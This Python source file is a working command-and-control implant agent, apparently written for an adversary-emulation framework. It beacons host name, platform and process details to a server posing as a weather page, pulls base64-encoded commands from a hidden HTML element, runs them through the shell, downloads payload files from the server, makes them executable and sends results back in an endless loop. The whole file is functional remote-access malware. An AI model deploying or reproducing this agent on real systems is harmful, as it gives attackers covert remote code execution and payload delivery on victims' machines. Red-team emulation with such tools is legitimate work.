import argparse
import datetime
import json
import os
import platform
import subprocess
import socket
import time
import stat
from base64 import b64encode, b64decode

import requests
from bs4 import BeautifulSoup


class OperationLoop:

    def __init__(self, profile):
        self.profile = profile
        self.file_download_endpoint = "/file/download"
        self.file_download_url = self.profile['server'].split('/weather')[0] + self.file_download_endpoint

    def start(self):
        """Agent loop operation:
            - Send beacon - where possible results are sent to server and next instructions retrieved
            - Instructions executed, results stored
            - sleep for set time
        """
        self.profile['results'] = []
        print('[*] Sending beacon for %s' % self.profile.get('paw', 'unknown'))
        while True:
            try:
                beacon = self._send_beacon()
                self.profile['results'].clear()
                instructions = self._next_instructions(beacon=beacon)
                sleep = self._handle_instructions(instructions)
                time.sleep(sleep)
            except Exception as e:
                print('[-] Operation loop error: %s' % e)
                time.sleep(30)

    """ PRIVATE """

    def _handle_instructions(self, instructions):
        self.profile['paw'] = instructions['paw']
        for instruction in json.loads(instructions['instructions']):
            i = json.loads(instruction)
            if i['payloads']:
                self._download_payloads(i['payloads'])
            result, seconds = self._execute_instruction(i)
            self.profile['results'].append(result)
            time.sleep(seconds)
        return instructions['sleep']

    def _next_instructions(self, beacon):
        soup = BeautifulSoup(beacon.content, 'html.parser')
        instructions = soup.find(id='instructions')
        return json.loads(self._decode_bytes(instructions.contents[0]))

    def _send_beacon(self):
        return requests.post(self.profile['server'], data=self._encode_string(json.dumps(self.profile)))

    def _execute_instruction(self, i):
        print('[+] Running instruction: %s' % i['id'])
        cmd = self._decode_bytes(i['command'])
        execution_timestamp = datetime.datetime.now().strftime('%Y-%m-%dT%H:%M:%SZ')
        try:
            output = subprocess.check_output(cmd, shell=True, timeout=i['timeout'])
        except subprocess.CalledProcessError as e:
            output = e.output
        return dict(output=self._encode_string(output.decode('utf-8', errors='ignore')), pid=os.getpid(), status=0, id=i['id'], agent_reported_time=execution_timestamp), i['sleep']

    def _download_payloads(self, payloads):
        for p in payloads:
            r = requests.get(self.file_download_url, headers={'file': p})
            with open(r.headers['FILENAME'], 'w') as fh:
                fh.write(r.content.decode('utf-8'))
            os.chmod(r.headers['FILENAME'], stat.S_IXUSR ^ stat.S_IRUSR ^ stat.S_IWUSR ^ stat.S_IRGRP ^ stat.S_IWGRP)

    @staticmethod
    def _decode_bytes(s):
        return b64decode(s).decode('utf-8', errors='ignore').replace('\n', '')

    @staticmethod
    def _encode_string(s):
        return str(b64encode(s.encode()), 'utf-8')


def build_profile(server_addr):
    return dict(
        server=server_addr,
        host=socket.gethostname(),
        platform=platform.system().lower(),
        executors=['sh'],
        pid=os.getpid()
    )


if __name__ == '__main__':
    parser = argparse.ArgumentParser('Start here')
    parser.add_argument('-W', '--website', required=False, default='http://localhost:8888/weather')
    args = parser.parse_args()
    try:
        p = build_profile('%s' % args.website)
        OperationLoop(profile=p).start()
    except Exception as e:
        print('[-] Web page may not be accessible, or: %s' % e)
